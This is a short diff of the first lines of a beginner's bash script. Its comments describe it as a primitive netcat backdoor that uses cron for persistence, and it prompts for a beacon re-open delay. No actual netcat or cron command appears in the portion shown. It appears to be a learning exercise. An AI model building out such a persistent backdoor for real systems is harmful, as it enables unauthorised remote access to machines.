@@ -1,8 +1,8 @@
 #! /bin/bash
 
 # This is my first real bash script, here I am commenting out so I know
-# what I am going to do with this. The first script will add something to
-# the cron file every 5 seconds, to proof as a form of persistance
+# what I am going to do with this. The first script will add something to cron
+# This is a very primative example of a backdoor on a program using netcat
 
 echo "How many seconds should I wait to re-open the beacon?(120s default)"
 read delay
